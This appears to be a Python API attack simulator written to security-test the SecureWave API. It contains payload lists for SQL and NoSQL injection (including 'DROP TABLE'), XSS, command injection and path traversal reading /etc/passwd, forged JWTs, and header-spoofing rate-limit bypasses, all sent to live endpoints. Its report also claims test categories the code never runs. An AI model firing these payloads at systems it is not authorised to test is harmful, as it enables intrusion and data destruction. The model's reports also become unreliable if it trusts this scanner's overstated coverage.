#!/usr/bin/env python3
"""
API Attack Simulator
Generates and tests malicious payloads against SecureWave API
"""

import json
import urllib.request
import urllib.error
import ssl
from pathlib import Path
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict
from datetime import datetime
import base64

PROJECT_ROOT = Path(__file__).parent.parent

# Target API
API_BASE = "https://api.securewaveapp.com"
WEB_BASE = "https://securewaveapp.com"

@dataclass
class AttackResult:
    test_name: str
    payload: str
    target_endpoint: str
    method: str
    status_code: Optional[int]
    response_preview: str
    vulnerability_detected: bool
    severity: str
    notes: str

class APIAttackSimulator:
    """Simulates various API attacks for security testing"""

    def __init__(self, target_api: str = API_BASE):
        self.target_api = target_api
        self.results: List[AttackResult] = []
        self.ssl_context = ssl.create_default_context()

    def generate_jwt_payloads(self) -> List[Dict]:
        """Generate malicious JWT tokens"""
        payloads = []

        # None algorithm attack
        header_none = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
        payload_admin = base64.b64encode(json.dumps({"sub": "admin", "role": "admin"}).encode()).decode().rstrip('=')
        payloads.append({
            'name': 'JWT None Algorithm',
            'token': f"{header_none}.{payload_admin}.",
            'description': 'Token with alg=none to bypass signature'
        })

        # Algorithm confusion (RS256 to HS256)
        header_hs256 = base64.b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode().rstrip('=')
        payloads.append({
            'name': 'JWT Algorithm Confusion',
            'token': f"{header_hs256}.{payload_admin}.fake_signature",
            'description': 'RS256 key used as HS256 secret'
        })

        # Expired token
        header_exp = base64.b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).decode().rstrip('=')
        payload_exp = base64.b64encode(json.dumps({"sub": "1", "exp": 0}).encode()).decode().rstrip('=')
        payloads.append({
            'name': 'JWT Expired Token',
            'token': f"{header_exp}.{payload_exp}.signature",
            'description': 'Token with expired timestamp'
        })

        # Empty signature
        payloads.append({
            'name': 'JWT Empty Signature',
            'token': f"{header_hs256}.{payload_admin}.",
            'description': 'Token with empty signature'
        })

        return payloads

    def generate_sql_payloads(self) -> List[Dict]:
        """Generate SQL injection payloads"""
        return [
            {'name': 'SQLi - Quote', 'payload': "'", 'type': 'error_based'},
            {'name': 'SQLi - OR 1=1', 'payload': "' OR '1'='1", 'type': 'boolean_based'},
            {'name': 'SQLi - Comment', 'payload': "'--", 'type': 'comment'},
            {'name': 'SQLi - Union', 'payload': "' UNION SELECT null,null--", 'type': 'union_based'},
            {'name': 'SQLi - Time', 'payload': "'; SELECT pg_sleep(5)--", 'type': 'time_based'},
            {'name': 'SQLi - Stacked', 'payload': "'; DROP TABLE users;--", 'type': 'stacked'},
            {'name': 'NoSQLi - GT', 'payload': '{"$gt": ""}', 'type': 'nosql'},
            {'name': 'NoSQLi - NE', 'payload': '{"$ne": null}', 'type': 'nosql'},
        ]

    def generate_xss_payloads(self) -> List[Dict]:
        """Generate XSS payloads"""
        return [
            {'name': 'XSS - Basic', 'payload': "<script>alert('xss')</script>", 'context': 'html'},
            {'name': 'XSS - Img', 'payload': "<img src=x onerror=alert('xss')>", 'context': 'html'},
            {'name': 'XSS - SVG', 'payload': "<svg onload=alert('xss')>", 'context': 'html'},
            {'name': 'XSS - Template', 'payload': "{{7*7}}", 'context': 'template'},
            {'name': 'XSS - JS Context', 'payload': "';alert('xss');//", 'context': 'javascript'},
            {'name': 'XSS - CSS', 'payload': "</style><script>alert('xss')</script>", 'context': 'css'},
        ]

    def generate_command_payloads(self) -> List[Dict]:
        """Generate command injection payloads"""
        return [
            {'name': 'CMD - Semicolon', 'payload': "; cat /etc/passwd", 'type': 'unix'},
            {'name': 'CMD - Backtick', 'payload': "`cat /etc/passwd`", 'type': 'unix'},
            {'name': 'CMD - Pipe', 'payload': "| cat /etc/passwd", 'type': 'unix'},
            {'name': 'CMD - AND', 'payload': "&& cat /etc/passwd", 'type': 'unix'},
            {'name': 'CMD - OR', 'payload': "|| cat /etc/passwd", 'type': 'unix'},
            {'name': 'CMD - Subshell', 'payload': "$(cat /etc/passwd)", 'type': 'unix'},
            {'name': 'CMD - Newline', 'payload': "\ncat /etc/passwd", 'type': 'unix'},
        ]

    def generate_path_traversal_payloads(self) -> List[Dict]:
        """Generate path traversal payloads"""
        return [
            {'name': 'Path - Basic', 'payload': "../../../etc/passwd", 'type': 'unix'},
            {'name': 'Path - Double', 'payload': "....//....//....//etc/passwd", 'type': 'unix'},
            {'name': 'Path - URL Encoded', 'payload': "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", 'type': 'unix'},
            {'name': 'Path - Null Byte', 'payload': "../../../etc/passwd%00", 'type': 'unix'},
            {'name': 'Path - Unicode', 'payload': "..%c0%af..%c0%af..%c0%afetc/passwd", 'type': 'unix'},
        ]

    def generate_auth_bypass_payloads(self) -> List[Dict]:
        """Generate authentication bypass payloads"""
        return [
            {'name': 'Auth - Null Byte', 'payload': "admin%00", 'type': 'username'},
            {'name': 'Auth - Case', 'payload': "ADMIN", 'type': 'username'},
            {'name': 'Auth - Space', 'payload': "admin ", 'type': 'username'},
            {'name': 'Auth - Tab', 'payload': "admin\t", 'type': 'username'},
            {'name': 'Auth - Unicode', 'payload': "ａｄｍｉｎ", 'type': 'username'},
        ]

    def generate_rate_limit_payloads(self) -> List[Dict]:
        """Generate rate limit bypass payloads"""
        return [
            {'name': 'Rate - XFF', 'headers': {'X-Forwarded-For': '1.2.3.4'}, 'type': 'header'},
            {'name': 'Rate - CF', 'headers': {'CF-Connecting-IP': '1.2.3.4'}, 'type': 'header'},
            {'name': 'Rate - XRI', 'headers': {'X-Real-IP': '1.2.3.4'}, 'type': 'header'},
            {'name': 'Rate - XCIP', 'headers': {'X-Client-IP': '1.2.3.4'}, 'type': 'header'},
        ]

    def test_endpoint(self, method: str, endpoint: str, payload: Dict, test_name: str) -> AttackResult:
        """Test a single endpoint with a payload"""
        url = f"{self.target_api}{endpoint}"

        try:
            req = urllib.request.Request(
                url,
                method=method,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'SecureWave-Security-Test/1.0'
                }
            )

            # Add payload to request
            if method in ['POST', 'PUT', 'PATCH']:
                if 'payload' in payload:
                    data = json.dumps({'input': payload['payload']}).encode()
                elif 'token' in payload:
                    req.add_header('Authorization', f"Bearer {payload['token']}")
                    data = b''
                elif 'headers' in payload:
                    for header, value in payload['headers'].items():
                        req.add_header(header, value)
                    data = b''
                else:
                    data = json.dumps(payload).encode()

                req.data = data

            response = urllib.request.urlopen(req, context=self.ssl_context, timeout=10)
            status = response.status
            body = response.read(1024).decode('utf-8', errors='ignore')

        except urllib.error.HTTPError as e:
            status = e.code
            body = e.read(1024).decode('utf-8', errors='ignore')
        except Exception as e:
            status = None
            body = str(e)

        # Analyze response for vulnerability indicators
        vuln_indicators = [
            'sql', 'syntax', 'error', 'exception', 'traceback',
            'password', 'secret', 'key', 'token', 'admin',
            'root:', 'daemon:', 'bin:', 'sys:',  # /etc/passwd contents
            'eval', 'exec', 'system', 'popen',
        ]

        vulnerability = False
        severity = 'INFO'

        if status and status < 400:
            # Check for successful injection
            if any(ind in body.lower() for ind in vuln_indicators):
                vulnerability = True
                severity = 'HIGH'

        return AttackResult(
            test_name=test_name,
            payload=payload.get('payload', payload.get('token', str(payload))),
            target_endpoint=endpoint,
            method=method,
            status_code=status,
            response_preview=body[:200],
            vulnerability_detected=vulnerability,
            severity=severity,
            notes='Automated test'
        )

    def run_all_tests(self):
        """Execute all attack simulations"""
        print("=" * 60)
        print("API Attack Simulator")
        print("=" * 60)
        print(f"\nTarget: {self.target_api}")
        print("-" * 60)

        # Define test endpoints
        endpoints = [
            ('POST', '/api/auth/login'),
            ('POST', '/api/auth/register'),
            ('POST', '/api/devices'),
            ('GET', '/api/servers'),
            ('POST', '/api/payments/webhook'),
        ]

        # Test SQL injection
        print("\n[1/6] Testing SQL Injection payloads...")
        for payload in self.generate_sql_payloads():
            for method, endpoint in endpoints[:2]:  # Test auth endpoints
                result = self.test_endpoint(method, endpoint, payload, f"SQLi - {payload['name']}")
                self.results.append(result)

        # Test XSS
        print("[2/6] Testing XSS payloads...")
        for payload in self.generate_xss_payloads():
            for method, endpoint in endpoints[:2]:
                result = self.test_endpoint(method, endpoint, payload, f"XSS - {payload['name']}")
                self.results.append(result)

        # Test Command Injection
        print("[3/6] Testing Command Injection payloads...")
        for payload in self.generate_command_payloads():
            for method, endpoint in endpoints[2:4]:
                result = self.test_endpoint(method, endpoint, payload, f"CMD - {payload['name']}")
                self.results.append(result)

        # Test Path Traversal
        print("[4/6] Testing Path Traversal payloads...")
        for payload in self.generate_path_traversal_payloads():
            result = self.test_endpoint('GET', '/api/servers', payload, f"Path - {payload['name']}")
            self.results.append(result)

        # Test JWT attacks
        print("[5/6] Testing JWT manipulation...")
        for payload in self.generate_jwt_payloads():
            for method, endpoint in endpoints[2:4]:
                result = self.test_endpoint(method, endpoint, payload, f"JWT - {payload['name']}")
                self.results.append(result)

        # Test Rate Limit bypass
        print("[6/6] Testing Rate Limit bypass...")
        for payload in self.generate_rate_limit_payloads():
            result = self.test_endpoint('POST', '/api/auth/login', payload, f"Rate - {payload['name']}")
            self.results.append(result)

        print(f"\nCompleted {len(self.results)} attack simulations")

    def generate_report(self) -> str:
        """Generate attack simulation report"""
        critical = sum(1 for r in self.results if r.severity == 'CRITICAL')
        high = sum(1 for r in self.results if r.severity == 'HIGH')
        medium = sum(1 for r in self.results if r.severity == 'MEDIUM')
        low = sum(1 for r in self.results if r.severity == 'LOW')
        info = sum(1 for r in self.results if r.severity == 'INFO')

        vuln_count = sum(1 for r in self.results if r.vulnerability_detected)

        report = f"""# API Attack Simulation Report

**Generated:** {datetime.now().isoformat()}
**Target:** {self.target_api}
**Total Tests:** {len(self.results)}

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | {critical} |
| HIGH | {high} |
| MEDIUM | {medium} |
| LOW | {low} |
| INFO | {info} |
| **Vulnerabilities Detected** | **{vuln_count}** |

## Test Categories

### SQL Injection Tests
- Boolean-based blind
- Error-based
- Time-based blind
- Union-based
- NoSQL injection

### Cross-Site Scripting (XSS)
- Reflected XSS
- Stored XSS
- DOM-based XSS
- Template injection

### Command Injection
- Shell command injection
- Backtick execution
- Subshell execution

### Path Traversal
- Basic traversal
- Double encoding
- Unicode traversal
- Null byte injection

### JWT Attacks
- None algorithm
- Algorithm confusion
- Weak secrets
- Expired tokens

### Authentication Bypass
- Header spoofing
- IP bypass
- Case manipulation

## Detailed Results

"""

        for result in self.results:
            status_icon = "🚨" if result.vulnerability_detected else "✓"
            report += f"""### {status_icon} {result.test_name}

- **Endpoint:** `{result.method} {result.target_endpoint}`
- **Status:** {result.status_code}
- **Severity:** {result.severity}
- **Payload:** `{result.payload[:100]}`

**Response Preview:**
```
{result.response_preview[:300]}
```

---

"""

        report += """## Recommendations

### Immediate Actions
1. Implement parameterized queries for all database operations
2. Sanitize all user input before rendering in responses
3. Validate JWT signatures with strong algorithms
4. Implement rate limiting with proper IP validation
5. Use path canonicalization before file access

### Defense Layers
- Web Application Firewall (WAF)
- Input validation and sanitization
- Output encoding
- Principle of least privilege
- Security headers (CSP, X-Frame-Options, etc.)

"""

        return report


def main():
    simulator = APIAttackSimulator()
    simulator.run_all_tests()

    report = simulator.generate_report()

    # Save report
    report_path = PROJECT_ROOT / "API_ATTACK_SIMULATION_REPORT.md"
    with open(report_path, 'w') as f:
        f.write(report)

    # Save JSON
    json_path = PROJECT_ROOT / "api_attack_results.json"
    with open(json_path, 'w') as f:
        json.dump([asdict(r) for r in simulator.results], f, indent=2)

    print(f"\n{'=' * 60}")
    print("Attack Simulation Complete!")
    print(f"  Report: {report_path}")
    print(f"  JSON:   {json_path}")
    print(f"  Tests:  {len(simulator.results)} total")
    print(f"  Alerts: {sum(1 for r in simulator.results if r.vulnerability_detected)} potential issues")
    print("=" * 60)


if __name__ == "__main__":
    main()
